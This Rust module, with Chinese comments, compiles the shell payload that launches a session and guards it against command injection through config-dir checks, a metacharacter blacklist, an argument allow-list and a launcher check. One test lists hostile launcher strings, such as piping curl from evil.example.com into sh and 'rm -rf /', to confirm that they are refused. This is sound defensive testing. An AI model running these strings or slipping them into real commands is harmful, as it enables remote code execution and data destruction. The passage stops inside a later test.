//! **「起一个会话」的载荷编译器** —— `env 前缀 → cd → argv → wrap` 那一段串的唯一 Rust 真相源。
//!
//! # 它是哪一层
//!
//! 一条完整的远端起会话命令有两层：
//!
//! ```text
//! tmux new-session -d -s '=name:' … ; send-keys -t … '<载荷>' Enter ; tmux attach …
//! └────────────────────── 外层：容器 ──────────────────────┘ └─ 内层：载荷 ─┘
//! ```
//!
//! 本模块只管**内层**。⚠ **不是因为外层「已经没了」** —— U8c-1 第一版这么写，被审计证伪：
//! daemon 的 `launch`（U8a-2b）**零生产调用方**、它**结构上也不 attach**（平面 ③），
//! 而 `account_usage.rs::build_usage_probe_cmd` 今天就在 Rust 里拼一整条外层 tmux 串。
//! 外层的四个产出方一个都没退役，处置见 `doc/INVARIANTS.md` §33b。
//!
//! # 它为什么住在这里（P4b，§1.4b）
//!
//! 它原来在共享 crate（当时叫 `launch-core`）里 —— 而 **daemon 对它零引用**。放在那儿的真实原因是
//! 「monitor 侧当时一个边界都没有，没处放」。P4a 划出 `backend/control/` 之后它回到了归属地：
//! §1.3 把最终 exec 钉在**用户自己的终端进程**里，U8a-2b 把 daemon 的执行面定成
//! **argv 直传、不过 shell** ⇒ **「渲染一条 shell 命令串」永远属于开终端的那一侧。**
//!
//! 唯一留在共享 crate 里的是 [`shell_quote_core::posix_quote`]（daemon 的 `tmux_hook` 真的在用）。
//!
//! # 诚实边界（别读成「合完了」）
//!
//! - 生产消费方今天有三个：`history.rs` 的 POSIX 分支（只用 [`config_dir_prefix_posix`]）、
//!   `account_usage.rs` 的用量探针（[`usage_probe_payload`] → [`render_payload`]）、
//!   以及 `backend/control/launch_wire.rs` 的 `render_launch_payload`（`container:"none"` 那格）。
//! - **Windows 分支不在这里** —— `$env:CLAUDE_CONFIG_DIR=$null; ` 与它自己那套
//!   「什么算绝对路径」（盘符 / UNC / `\` 分隔）是刻意的平台特化。
//! - TS 侧还剩 `launch-render-fallback.ts` 一个产出点（U8c-3 删除）。跨语言一致性由
//!   `fixtures/payload-golden.json` 的**逐字节对拍**保证（TS 生成并入库、Rust 读同一份自己渲染再比）。

/// P1：**业务拒绝的唯一构造口** —— 所有「渲染不出来，且这是坏输入」的 `Err` 都必须经这里。
///
/// # 为什么要打标（不是为了好看）
///
/// TS 侧 `sendIntoViaDaemon` 的 catch 此前把两件事混成一件：**IPC 异常**（后端崩/序列化坏）
/// 与**载荷渲染被拒**。它的注释推理「两者都在 daemon 那一跳之前 ⇒ 能证明什么都没发出去
/// ⇒ 可回落」——**对一半错一半**：没发出去只说明**重做不会重复执行**，
/// **不说明重做走的那条路也会拒**。而回落那条路是 TS 兜底渲染器，
/// 它对同样输入**未必拒**（`remote-launch-run.ts` 自己逐字承认过）。
/// ⇒ 一次 Rust 侧的 fail-closed 被那个 catch 变成了 fail-open。
///
/// 打标之后 TS 侧按标记分流：带标记 ⇒ `refused`（不回落 + toast）；不带 ⇒ IPC 异常 ⇒ `fallback`。
///
/// # 它不是什么
///
/// ⚠ 这是**字符串约定不是类型**（诚实边界 9a）：有人手写一个带同样前缀的普通错误串，
/// 就会被 TS 当成业务拒绝。要靠类型分开得让 command 的错误结构化 —— 那是 `U6`，单独立项。
/// 全仓实测：**70 个 tauri command 的错误类型 100% 是 `String`**，本件不在这里开第一个口。
pub(crate) const REFUSE_TAG: &str = "REFUSE:";

/// 见 [`REFUSE_TAG`]。判据 `every_business_rejection_is_tagged` 钉住「渲染路径上不许裸 `Err`」。
pub(crate) fn refuse(msg: impl std::fmt::Display) -> String {
    format!("{REFUSE_TAG} {msg}")
}

use std::fmt::Write as _;

/// 两种 shell 共用的元字符黑名单。
///
/// **`\` 不在里面** —— 见 [`config_dir_command_safe`]：POSIX 侧由调用点额外拒掉它
/// （那边的路径里不该有反斜杠），而 Windows 侧的账号目录长成 `C:\Users\z\.claude-accts\z`，
/// 把 `\` 一律禁掉等于禁掉整个平台。它在两种 shell 的**单引号**里都是字面量
/// （POSIX `'…'` 无转义；PowerShell `'…'` 无插值），真正要挡的是能提前闭合引号或另起命令的那几个。
/// 〔audit-0805 08-06〕提为 `pub(crate)`：它是**权威源**，
/// `history.rs` 那份逐字副本已删（E3），判据也要遍历这一份而不是再抄一遍。
pub(crate) const SHELL_META_COMMON: &str = "'\"`$;|&<>*?()!";

/// 一个字符能不能出现在**要拼进命令**的 config dir 里。
///
/// # 不可见字符判据为什么是 `acct_core::is_deceptive_char`
///
/// U7-3 把这张表收进 `acct-core` 并让两个**读 manifest** 的地方共用
/// （`local_accounts.rs` · `accounts_query.rs`），取的是两侧并集。
/// **但「拼命令」那条路当时没跟上** —— `history.rs` 一直用自己那张 U7-3 之前的 18 项旧表，
/// 缺 `U+1680` · `U+2000..200A` · `U+202F` · `U+205F` · `U+2060..2064` · `U+3000`
/// （实测 `history.rs` 全文零 `acct_core` import）。
///
/// ⚠ **诚实定级**：那是**纵深防御**的缺口，不是当时可利用的洞 —— configDir 的上游
/// （本机 / 远端 manifest）都已经用并集把过一道。但「权威也保留本地校验」是这个仓自己
/// 写在 `resolve_query.rs` 头注里的纪律（B2），少一层就是少一层。
pub fn is_command_unsafe_char(c: char) -> bool {
    c.is_control()
        || ('\u{0080}'..='\u{009f}').contains(&c)
        || SHELL_META_COMMON.contains(c)
        || acct_core::is_deceptive_char(c)
}

/// **POSIX 命令面**的 config dir 校验：绝对 POSIX 路径、无 `..` 段、无反斜杠、
/// 无元字符/控制符/视觉欺骗字符。
///
/// fail-closed：稍有可疑即判非法，**绝不拼进命令**。
pub fn config_dir_command_safe(dir: &str) -> bool {
    if !dir.starts_with('/') || dir == "/" || dir.contains("/../") || dir.ends_with("/..") {
        return false;
    }
    !dir.chars().any(|c| c == '\\' || is_command_unsafe_char(c))
}

/// 「这次拉起用哪个账号」—— **三态，不是两态**。
///
/// | 取值 | 含义 | 产出的前缀 |
/// |---|---|---|
/// | `None`（参数缺席） | 调用方没表态 | 空串 |
/// | [`Account::Base`] | 用户**显式**选了账号 0 | `unset CLAUDE_CONFIG_DIR; ` |
/// | [`Account::Named`] | 具名账号 | `export CLAUDE_CONFIG_DIR='…'; ` |
///
/// **「账号 0」不能等于「什么都不加」**：用户的 shell rc 里很可能有一句
/// `export CLAUDE_CONFIG_DIR=<默认账号>`（`cc-acct-iso shellinit` 生成的就是它），
/// 而本机拉起**故意加载 rc** ⇒「什么都不加」会落到默认账号上 = **静默串号**。
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Account<'a> {
    Base,
    Named { config_dir: &'a str },
}

/// POSIX 账号前缀。非法 configDir ⇒ `Err`（调用方报错，绝不拼进命令）。
pub fn config_dir_prefix_posix(account: Option<&Account>) -> Result<String, String> {
    match account {
        None => Ok(String::new()),
        Some(Account::Base) => Ok(UNSET_CONFIG_DIR_PREFIX.to_string()),
        Some(Account::Named { config_dir }) => {
            let d = config_dir.trim();
            // 空串**不是**账号 0，是坏数据（空值 ≠ 未设 —— Z01 起整套设计的支点）。
            if d.is_empty() {
                return Err(refuse("具名账号的 configDir 是空的（账号 0 请用 base）"));
            }
            if !config_dir_command_safe(d) {
                return Err(refuse(format!("拒绝拼入命令：非法 CLAUDE_CONFIG_DIR {d:?}")));
            }
            Ok(format!("export CLAUDE_CONFIG_DIR='{d}'; "))
        }
    }
}

/// 「**显式不注入** `CLAUDE_CONFIG_DIR`」这条前缀 —— 也就是账号 0 的起法。
///
/// 逐字节形态被 e2e 探针用 `grep -q "unset CLAUDE_CONFIG_DIR;"` 断言，且与 TS
/// `shell-quote.ts::UNSET_CONFIG_DIR_PREFIX` 同源（对拍夹具覆盖）。
pub const UNSET_CONFIG_DIR_PREFIX: &str = "unset CLAUDE_CONFIG_DIR; ";

/// 载荷里的一条环境操作。
///
/// **刻意是窄变体而不是通用 `{op, key, value}`**（照搬 TS `launch-plan.ts::EnvOp` 的裁决）：
/// 通用形态等于给任何上游开一个「往命令里塞任意变量名」的口子，
/// 而实际产出者的键集合全是代码里写死的。把「清哪些变量」从**数据**移进**变体名**之后，
/// 那件事在类型层不可表达。
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum EnvOp<'a> {
    ExportConfigDir {
        value: &'a str,
    },
    ExportModel {
        value: &'a str,
    },
    UnsetConfigDir,
    /// 嵌套会话标记全套。键表由调用方给（TS 侧来自 `AGENT_PROFILE.nestedEnvVars`）——
    /// **这是唯一一处键表不写死在本 crate 里的地方**，因为它是 per-agent 的画像数据。
    UnsetNestedEnv {
        keys: &'a [&'a str],
    },
}

/// 包裹规格：`( <prelude>; exec <inner> )`，`order` = 嵌套深度（升序由内向外折叠）。
///
/// `exec` 不能省 —— wrapper 用 `$BASHPID` 读 `sessions/$cpid.json`，不 exec 则 PID 对不上。
/// **`inner` 必须是「只有 argv」的那一段，不能带 env 前缀或 `cd`**：`exec` 后面必须直接跟
/// 可执行文件，否则折叠出 `( …; exec unset A B; claude … )` ⇒ 实测 rc=127，launcher 起不来。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WrapSpec<'a> {
    pub order: i64,
    pub prelude: &'a str,
}

/// 一个 argv 元素能不能安全地参与 `join(" ")`。
///
/// 载荷是空格拼起来的一整条 shell 串，所以 arg 里**任何空白都会让它裂成多个参数**，
/// 任何 shell 元字符都可能另起一条命令。放行集刻意窄：字母数字 + `-_.:/=,@+`
/// —— 覆盖 `--resume` 与 UUID 形态的 sid（今天 `args` 的唯一真实内容），其余一律拒。
///
/// ⚠ **已知过严、且与同 crate 另一道闸不对称**（代码审计指出）：这里用 `is_ascii_alphanumeric`
/// ⇒ **非 ASCII 一律拒**，而 [`config_dir_command_safe`] 是**放行中文的**（`/home/用户/…`
/// 有专门的放行测试）。不带引号的 CJK 对 shell 是惰性的（不分词、非元字符），
/// 所以这一格今天是「宁可过严」。**今天零生产流量**（`plan.args` 恒空），
/// 等 U8c-2b 往 args 里塞 `--add-dir <中文路径>` 这类东西时会撞上 —— 届时错误文案说的是
/// 「含空白或 shell 元字符」，**会误导**，要一并改。
pub fn arg_is_join_safe(a: &str) -> bool {
    !a.is_empty()
        && a.chars().all(|c| {
            c.is_ascii_alphanumeric()
                || matches!(c, '-' | '_' | '.' | ':' | '/' | '=' | ',' | '@' | '+')
        })
}

/// 载荷编译的输入。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PayloadSpec<'a> {
    pub env: &'a [EnvOp<'a>],
    /// `None` = 不加 `cd`。**顺序不是任意的**：`cd` 排在 env 之后、argv 之前
    /// （`<envOps>cd '<cwd>' && <argv>`），早期实现曾把它放最前面，逐字节对拍时抓到。
    pub cwd: Option<&'a str>,
    /// launcher。**sanitize 必须先于 wrap**（设计债 #2）。
    ///
    /// ⚠ **08-08 订正**：本行原写「那是函数组合上的**结构保证**，本 crate 收的是结果，
    /// 不在这里再 sanitize 一次」——**当时不成立**：字段是裸 `&str`，而 wire 那条路
    /// （`launch_wire.rs`）把 `&req.launcher`（**来自 webview**）原样传了进来，
    /// 中间没有任何净化。所谓「结构保证」只是一句调用约定。
    /// ⇒ `render_payload` 现在自己拒注入字符（见那里的注释），
    /// 由 `the_launcher_is_refused_when_it_carries_injection_chars` 钉住。
    pub launcher: &'a str,
    pub args: &'a [&'a str],
    pub wrap: &'a [WrapSpec<'a>],
}

fn render_env_ops(ops: &[EnvOp]) -> Result<String, String> {
    let mut out = String::new();
    for op in ops {
        match op {
            EnvOp::ExportConfigDir { value } => {
                // ★ 与 `config_dir_prefix_posix` 同一道闸 —— 两个入口不许安全姿态相反。
                if value.is_empty() {
                    return Err(refuse("configDir 是空串（账号 0 请用 UnsetConfigDir）"));
                }
                if !config_dir_command_safe(value) {
                    return Err(refuse(format!("拒绝拼入命令：非法 CLAUDE_CONFIG_DIR {value:?}")));
                }
                let _ = write!(
                    out,
                    "export CLAUDE_CONFIG_DIR={}; ",
                    shell_quote_core::posix_quote(value)
                );
            }
            EnvOp::ExportModel { value } => {
                let _ = write!(
                    out,
                    "export ANTHROPIC_MODEL={}; ",
                    shell_quote_core::posix_quote(value)
                );
            }
            EnvOp::UnsetConfigDir => out.push_str(UNSET_CONFIG_DIR_PREFIX),
            EnvOp::UnsetNestedEnv { keys } => {
                if keys.is_empty() {
                    return Err(refuse("嵌套 env 键表是空的 ⇒ 会渲染出裸 `unset ; `"));
                }
                let _ = write!(out, "unset {}; ", keys.join(" "));
            }
        }
    }
    Ok(out)
}

fn apply_wraps(inner: String, wraps: &[WrapSpec]) -> String {
    let mut ordered: Vec<&WrapSpec> = wraps.iter().collect();
    ordered.sort_by_key(|w| w.order);
    ordered
        .into_iter()
        .fold(inner, |s, w| format!("( {}; exec {} )", w.prelude, s))
}

/// `env ops → cd → argv → wrap` 的编译。与 TS `launch-render-fallback.ts` 的
/// 「非容器 / 载荷」那一段逐字节同义（对拍夹具是判据，不是这句注释）。
///
/// # 为什么回 `Result` 而不是 `String`（U8c-1 代码审计 R1/R2）
///
/// 第一版回 `String`，于是同一个 crate 里两个「产出 `export CLAUDE_CONFIG_DIR=…`」的入口
/// **安全姿态相反**：[`config_dir_prefix_posix`] 会校验，而 `EnvOp::ExportConfigDir`
/// 一个字符都不查。审计实跑：
///
/// ```text
/// export-config-dir = "/a'b"   TS: throw          Rust: export CLAUDE_CONFIG_DIR='/a'\''b';
/// export-config-dir = "rel/x"  TS: throw          Rust: export CLAUDE_CONFIG_DIR='rel/x';
/// ```
///
/// ⚠ **这一类差异「TS 生成夹具」这个机制结构上抓不到** —— 要让夹具覆盖它，TS 侧生成夹具时
/// 就会 throw，那条用例根本进不了夹具。加多少用例都没用。⇒ 只能靠**类型**：回 `Result`。
///
/// # 空串一律是坏数据，不是「没有」（Z01 起的支点：空值 ≠ 未设）
///
/// TS 侧把 `""` 当「没有」（`plan.cwd ? … : ""`），Rust 侧不跟 —— 两种产物在生产里都是坏的：
/// `cd '' && …` 会短路让 launcher 起不来，`CLAUDE_CONFIG_DIR=''` 是**静默串号**。
/// ⇒ 本 crate 对 `Some("")` / `value: ""` 回 `Err`。**这是与 TS 的一处刻意分歧**，
/// 记在 `doc/INVARIANTS.md` §33b；U8c-2/3 收编 TS 时要一并把那边也改成 fail-closed。
///
/// # `args` 的盲区已经闭掉（U8c-2a）
///
/// U8c-1 交付时这里写着「`args` 不 quote，两侧一起错 ⇒ 对拍照绿，U8c-2 让 Rust 当生产者时
/// 必须先解决」。**本轮解决了**：每个 arg 过 [`arg_is_join_safe`] 白名单，
/// 含空白或 shell 元字符一律 `Err`。
///
/// **刻意不改成逐个 quote** —— 那会与 TS 的 `join(" ")` 逐字节分家，而黄金串对拍正靠字节相等。
/// 白名单让**会裂/会注入的那一类在类型之外不可表示**，合法输入的字节一个都没变。
///
/// - **`launcher` 的 sanitize** 仍然不管：收的是已净化值（见 [`PayloadSpec::launcher`]）。
///
/// # 只覆盖 TS 两种载荷形态里的一种
///
/// `renderFallback` 的 `container:"none"` 分支是 `env + cd + argv`，
/// `container:"tmux"` 分支是 `env + argv`（**没有 `cd`** —— cwd 单独交给 `SESSION_BACKEND`）。
/// 本函数是前者。U8c-2 接 tmux 路径时**必须传 `cwd: None`**，否则会多出一段 `cd`。
pub fn render_payload(spec: &PayloadSpec) -> Result<String, String> {
    for a in spec.args {
        if !arg_is_join_safe(a) {
            return Err(refuse(format!(
                "拒绝拼入命令：参数 {a:?} 不在放行集里 —— 载荷是 `join(\" \")` 拼的，\
                 空白会让它裂成多个参数、shell 元字符会另起一条命令。\n\
                 放行集是 `[A-Za-z0-9] + -_.:/=,@+`；**非 ASCII 也一律拒**（已知过严，\
                 且与 `config_dir_command_safe` 放行中文不对称，见 `arg_is_join_safe` 头注）"
            )));
        }
    }
    // ★ **launcher 也要过一道**〔audit-0805 08-08〕：本函数对 `args` 逐个过白名单，
    // 而 `launcher` 此前**一个检查都没有** —— 它被直接拼进 `argv` 再 `join(" ")`。
    // 这条路的上游是 tauri 命令 `render_launch_payload`：`launcher` 来自 webview。
    //
    // ⚠⚠ **08-08 订正赌注**（本条建成的次轮先核出来的）：这道检查是**纵深，不是边界**。
    // `daemon_send_into` 同样是注册命令，它的 `payload: String` 也来自 webview，
    // 而 daemon 侧只查「非空 / 长度 / 无控制字符」（`check_field`）—— 也就是说
    // **前端本来就能绕过本函数，直接送一条任意载荷去键入**。
    // ⇒ 本检查买到的是：① 走**文档化的那条路**时不会把注入串拼进载荷（挡的是**缺陷**，
    // 不是攻击者）；② 与同函数 `args` 那道白名单**姿态一致**（不对称本身会误导下一个人）。
    // 真正的边界在别处：daemon 的 `admit`（会话身份）+ 前端执行面（CSP / 能力表）。
    //
    // 字符集镜像 TS 的 `sanitizeRemoteLauncher`（今天真正管着这条路的那份策略），
    // 但按本函数的既有惯例**返回 `Err` 而不是静默回落**：拒绝要让调用方看得见。
    // ⚠ 刻意**不复用** `history::sanitize_launcher` 的白名单 —— 它排掉了 `/`，
    // 而远端 launcher 合法地可以是 `/usr/local/bin/claude`（收太紧 = 把一个洞换成一个回归）。
    if let Some(c) = spec
        .launcher
        .chars()
        .find(|c| matches!(c, ';' | '|' | '&' | '$' | '`' | '<' | '>' | '\n' | '\r'))
    {
        return Err(refuse(format!(
            "拒绝拼入命令：launcher {:?} 含注入字符 {c:?} —— 载荷会被键进会话执行，\n\
             一个 `;` 或 `|` 就能另起一条命令。合法形态是命令名或路径（可带空格分段）。",
            spec.launcher
        )));
    }
    let mut argv = vec![spec.launcher];
    argv.extend_from_slice(spec.args);
    let inner = argv.join(" ");
    let cd = match spec.cwd {
        Some("") => return Err(refuse("cwd 是空串 —— 空值 ≠ 未设；不加 cd 请用 None")),
        Some(c) => format!("cd {} && ", shell_quote_core::posix_quote(c)),
        None => String::new(),
    };
    Ok(format!(
        "{}{}{}",
        render_env_ops(spec.env)?,
        cd,
        apply_wraps(inner, spec.wrap)
    ))
}

/// 一次性**用量探针**会话的启动载荷（U8c-2a：`render_payload` 的第一个生产用例）。
///
/// 形态 `<账号前缀>unset <嵌套env>; <launcher>` —— **没有 `cd`**（探针不关心工作目录），
/// 也就是 `PayloadSpec { cwd: None, args: [], wrap: [] }` 那一格。
///
/// # 账号维度**恒显式表态，只有两态**
///
/// 用量探针恒是 per-account 的 —— 探不出「哪个账号」的用量就没有意义：
///
/// | `config_dir` | 含义 | 前缀 |
/// |---|---|---|
/// | `Some(路径)` | 具名账号 | `export CLAUDE_CONFIG_DIR='…'; ` |
/// | `None` | **账号 0**（Z03） | `unset CLAUDE_CONFIG_DIR; ` |
/// | `Some("")` | **坏数据，不是账号 0** | `Err` |
///
/// **绝不退化成裸载荷** —— 远端 rc 里那句 `export CLAUDE_CONFIG_DIR=<默认账号>` 会让探针
/// 探到别的号，而 UI 会把结果标成账号 0 的用量 = **静默串号**。
pub fn usage_probe_payload(
    config_dir: Option<&str>,
    nested_env: &[&str],
    launcher: &str,
) -> Result<String, String> {
    let account = match config_dir {
        None => EnvOp::UnsetConfigDir,
        Some("") => {
            return Err(refuse("用量探针需要显式 configDir（账号 0 请传 None，空串是坏数据）"))
        }
        Some(dir) => EnvOp::ExportConfigDir { value: dir },
    };
    render_payload(&PayloadSpec {
        env: &[account, EnvOp::UnsetNestedEnv { keys: nested_env }],
        cwd: None,
        launcher,
        args: &[],
        wrap: &[],
    })
}

#[cfg(test)]
mod tests {
    /// P1：**`REFUSE_TAG` 是跨语言双写点，两侧必须逐字一致**。
    ///
    /// 照仓里现成的形状写（`launch.rs::the_posix_marker_is_the_one_the_frontend_matches_on`）——
    /// `include_str!` 读前端那份，把字面量抠出来对拍。改一边不改另一边 ⇒ 红。
    ///
    /// 为什么非钉不可：前端靠这个标区分「载荷渲染被拒」（不许回落）与「IPC 异常」（可回落）。
    /// 标不一致 ⇒ 业务拒绝被当成通道异常 ⇒ **回落到兜底渲染器**，
    /// 而它对同样输入未必拒 ⇒ 一次 fail-closed 悄悄变回 fail-open，**且没有任何东西会报错**。
    #[test]
    fn the_refuse_tag_is_the_same_string_on_both_sides() {
        const RUNNER: &str = include_str!("../../../../src/remote-launch-run.ts");
        let key = "const REFUSE_TAG = \"";
        let at = RUNNER
            .find(key)
            .expect("前端找不到 REFUSE_TAG —— 抽取坏了，本断言在空转");
        let rest = &RUNNER[at + key.len()..];
        let front = &rest[..rest.find('"').expect("字面量没收尾")];
        assert!(
            front.chars().count() >= 4,
            "抽到的标太短（{front:?}）—— 抽取坏了"
        );
        assert_eq!(
            front, super::REFUSE_TAG,
            "\n前端按 {front:?} 认业务拒绝，而后端打的是 {:?} —— 两侧漂了。\n\
             后果不是报错，是**静默回落**：业务拒绝被当成 IPC 异常 ⇒ 走兜底渲染器 ⇒ \n\
             一次 fail-closed 变回 fail-open。两边必须一起改。",
            super::REFUSE_TAG
        );
    }

    /// P1-Y2：**渲染路径上的业务拒绝，一条都不许裸写** —— 必须经 [`refuse`] 打标。
    ///
    /// # 为什么钉「构造方式」而不是「哪些串是拒绝」
    ///
    /// 后者就是 `topbar-icons.vitest.ts` 头注骂过的「**按字符黑名单取样**」：
    /// 判据去猜哪些文案算拒绝 ⇒ 新增一条忘了登记就漏。钉构造口则相反 ——
    /// **新增拒绝理由忘了打标，这条会红**，不靠人记得。
    ///
    /// # 它逮到过什么（不是假想）
    ///
    /// 本件第一遍改写时**漏了两处多行 `Err(format!(…))`**（参数放行集 / launcher 注入字符），
    /// 正是这条判据的目标形状 —— 单行的好改，多行的容易漏。
    ///
    /// # 它管不了什么（诚实边界 9a/9b）
    ///
    /// ⚠ 人群限于**本文件**。拒绝理由若长到别的文件里，这条看不见 ——
    /// 所以下面带一条**人群自检**：本文件必须真的是渲染路径的拒绝所在地（`refuse` 有调用者）。
    /// ⚠ 打标是**字符串约定不是类型**：手写一个带同样前缀的普通错误串也会被 TS 当成业务拒绝（`U6`）。
    #[test]
    fn every_business_rejection_is_tagged() {
        let src = guard_core::production_code(include_str!("payload.rs"));
        // 人群自检 —— **不数定义行**〔D 阶段补审 08-11 订正〕。
        //
        // 原版是 `src.matches("refuse(").count() >= 2`，而生产段实得 **10** 处，
        // 其中 **1 处是 `pub(crate) fn refuse(` 定义行自己** ⇒ 阈值实际只要求
        // 「有 1 个调用方」。诊断词却写着「要么拒绝点被搬走了」——**搬走 8 处它不知道**。
        // ⇒ 排掉定义行，阈值按今天的真实调用点数取（**只许降到这个数以上**，
        // 少了就说明拒绝点在流失，那正是要红的时刻）。
        let callers = src
            .lines()
            .filter(|l| !l.contains("fn refuse("))
            .map(|l| l.matches("refuse(").count())
            .sum::<usize>();
        assert!(
            callers >= 8,
            "本文件生产段里 `refuse(` 的**调用点**只剩 {callers} 处（08-11 实测 9）—— 人群在流失。\n\
             要么拒绝点被搬走了（那这条判据该跟着搬），要么打标被摘了。\n\
             ⚠ 原版把定义行也算进去、阈值又只有 2，等于「有一个调用方就算数」。"
        );
        // ⚠ **第一版是假绿的，形状记下来**：原来扫的是「以 `return Err(` **开头**的行」，
        // 而 `Some("x") => return Err(…)` 这种 `match` 臂里 `return` 不在行首 ⇒ **漏**。
        // 变异当场证伪（造了一处裸 `Err` 而判据照样绿）。
        // ⇒ 改成扫**每一处 `Err(`**，看它后面紧跟的是不是 `refuse(`，与它在行里的位置无关。
        let mut offenders = Vec::new();
        for (i, line) in src.lines().enumerate() {
            let t = line.trim_start();
            // `Err(` 的每一次出现（一行可能有多次）
            for (col, _) in t.match_indices("Err(") {
                let rest = &t[col + "Err(".len()..];
                // 打了标 = 紧跟 `refuse(`；`Ok(`/`.map_err(`/类型位置的 `Err` 不在此列
                if rest.trim_start().starts_with("refuse(") {
                    continue;
                }
                // ⚠ **原来这里无条件排除 `Err(e)` / `Err(err)` / `Err(r)`**（本意是排模式匹配）。
                // 实测：本文件生产段被它排掉的是 **0 处** —— 它今天一个真实用途都没有，
                // 却给未来开了个口：`let e = format!("坏输入 {x:?}"); return Err(e);`
                // **构造一个裸错误值也会被跳过**，而那不是刁钻写法，是最常见的重构结果。
                // ⇒ 删掉。真出现模式匹配再按**那一处的形状**精确排除（`=>` 在同一行之类），
                // 不预先开一个按标识符名字放行的口。
                offenders.push(format!("{}: {}", i + 1, t.chars().take(72).collect::<String>()));
            }
        }
        // ★ **另外三条出口**〔D 阶段补审 08-11 新增〕：判据原来只看 `Err(`，
        // 而这三种同样能产出一个未打标的业务拒绝，且今天生产段**各 0 处** ——
        // 这是**禁令**不是抽样：它们一旦出现就绕过了整条打标纪律。
        for verb in ["ok_or_else(", "ok_or(", ".map_err("] {
            let n = src.matches(verb).count();
            assert_eq!(
                n, 0,
                "生产段出现了 `{verb}`（{n} 处）—— 它能产出一个**没经 `refuse()`** 的错误串。\n\
                 TS 侧按 `REFUSE:` 标分流；不打标的拒绝会被当成 IPC 异常 ⇒ **回落到兜底渲染器**\n\
                 ⇒ 一次 fail-closed 当场变 fail-open。要用它就先让它经 `refuse(...)`。"
            );
        }

        assert!(
            offenders.is_empty(),
            "渲染路径上有**没打标**的业务拒绝：\n  {}\n\n\
             全部要经 `refuse(...)`（见它的头注）。不打标 ⇒ TS 侧 `sendIntoViaDaemon` 分不出\n\
             「载荷渲染被拒」与「IPC 异常」⇒ 会**回落到兜底渲染器**，而它对同样输入未必拒\n\
             ⇒ 一次 Rust 侧的 fail-closed 当场变成 fail-open。",
            offenders.join("\n  ")
        );
    }

    /// ★★ **`launcher` 也要拒绝注入字符**〔audit-0805 08-08，Phase G 第 93 件〕。
    ///
    /// # 先核出来的不对称
    ///
    /// `render_payload` 对 `args` 逐个过 `arg_is_join_safe`（白名单），而 **`launcher`
    /// 一个检查都没有** —— 它被直接 `push` 进 `argv` 再 `join(" ")`。
    /// 而 `render_launch_payload` 是**注册过的 tauri 命令**：`launcher` 来自 webview。
    ///
    /// ⚠⚠ **次轮先核订正了赌注**：这道检查是**纵深不是边界** —— `daemon_send_into`
    /// 的 `payload` 同样来自 webview 且只受「非空/长度/无控制字符」约束，
    /// 前端本来就能绕过本函数直接送任意载荷。本条挡的是**缺陷**（走文档化那条路时
    /// 把注入串拼进载荷）与**姿态不一致**（同函数 `args` 有闸而 `launcher` 没有）。
    /// 真边界在 daemon 的 `admit` 与前端执行面 —— 见 `ROADMAP §5` 那条登记。
    ///
    /// 该字段的头注写着「已 sanitize 过的 launcher …… 本 crate 收的是**结果**」——
    /// 那是**调用约定**，不是这一侧的保证：wire 那条路（`launch_wire.rs`）把
    /// `&req.launcher` 原样传了进来，中间没有任何净化。
    ///
    /// # 为什么用「拒绝这几个字符」而不是复用别处的白名单
    ///
    /// 仓里已有两份 launcher 策略，**各自服务不同的合法形状**：
    /// · TS 的 `sanitizeRemoteLauncher`：拒 ``[;|&$`<>\r\n]`` ⇒ 回落默认 launcher；
    /// · Rust 的 `history::sanitize_launcher`：白名单（字母数字 `- _ .` 空格）⇒ `Err`。
    ///
    /// 后者**排掉了 `/`**，而远端 launcher 合法地可以是 `/usr/local/bin/claude`；
    /// 直接复用它会把正当用法判死（**收太紧 = 把一个洞换成一个回归**，第 86 件的教训）。
    /// ⇒ 这里镜像**今天真正管着这条路**的那份策略（TS 那条）的字符集，
    /// 但按本函数的既有惯例**返回 `Err` 而不是静默回落** —— 与 `args` 那一支一致：
    /// 拒绝要让调用方看得见，静默替换会让人以为自己填的生效了。
    #[test]
    fn the_launcher_is_refused_when_it_carries_injection_chars() {
        for bad in [
            "claude; curl evil.example.com | sh",
            "claude && rm -rf /",
            "claude `id`",
            "claude $(id)",
            "claude\nrm -rf /",
            "claude > /etc/passwd",
        ] {
            let r = super::render_payload(&super::PayloadSpec {
                env: &[],
                cwd: None,
                launcher: bad,
                args: &[],
                wrap: &[],
            });
            assert!(
                r.is_err(),
                "`launcher` = {bad:?} 被原样拼进了载荷：{:?}\n\
                 ★ 这条路是 tauri 命令 `render_launch_payload` ⇒ `launcher` 来自 webview，\n\
                 而渲出来的载荷会被**键进用户的会话执行**。\n\
                 ⚠ 同一个函数对 `args` 逐个过白名单，`launcher` 却一个检查都没有 —— \n\
                 那份不对称正是本条要挡的。",
                r.ok()
            );
        }
        // 正例：合法 launcher 不许被误伤（收太紧 = 把一个洞换成一个回归）。
        for ok in [
            "claude",
            "/usr/local/bin/claude",
            "wsl claude",
            "claude-code.exe",
        ] {
            let r = super::render_payload(&super::PayloadSpec {
                env: &[],
                cwd: None,
                launcher: ok,
                args: &[],
                wrap: &[],
            });
            assert!(r.is_ok(), "合法 launcher {ok:?} 被拒了：{:?}", r.err());
        }
    }

    /// ★★ **载荷的拼装只许有一份 Rust 实现**〔audit-0805 08-08，Phase G 第 62 件，E3〕。
    ///
    /// 本模块头注第一行逐字写着「`env 前缀 → cd → argv → wrap` 那一段串的
    /// **唯一 Rust 真相源**」。那句话撑着一条真实性质：载荷会被 `send-keys` 原样
    /// 键进会话，拼装一旦有第二份，两份的**引用规则与拼接顺序**就会各自演化 ——
    /// 而那正是本工作区反复在治的「同一职责多处落地」（E3）。
    ///
    /// ⇒ 而它**只是散文**（08-08 横扫「唯一」类声称时逮到：没有任何判据读它）。
    ///
    /// # 钉法
    ///
    /// 人群 = 整棵 monitor 源码树的生产段里，每一处拼 `cd <目录> && ` 这个**载荷片段**
    /// 的地方。今天恰好一处（本模块的 `render_payload`）。先量过误红面：全树只此一处。
    ///
    /// ⚠ **不钉 argv / wrap 那两段**：它们没有同样窄的特征串，硬造一个匹配单位
    /// 会比事实大（F24 那一族）。**只钉钉得住的那一段**，并把这句话留在这里 ——
    /// 别让后来者以为整条拼装都被守住了。
    #[test]
    fn the_payload_cd_prefix_is_assembled_in_exactly_one_place() {
        // 运行时拼：写成字面量的话，本条自己的诊断文案也会被数进去（F58 记过两次）。
        let frag = format!("cd {}{} && ", "{}", "");
        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src");
        let mut sites: Vec<String> = Vec::new();
